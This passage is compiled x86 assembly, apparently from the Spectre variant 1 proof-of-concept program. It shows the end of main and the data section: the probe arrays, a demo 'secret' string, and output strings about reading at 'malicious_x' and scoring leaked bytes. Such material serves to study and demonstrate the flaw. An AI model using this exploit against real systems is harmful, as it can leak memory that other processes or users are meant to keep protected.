	jmp	.LBB4_38
.LBB4_40:
	xor	eax, eax
	add	esp, 76
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
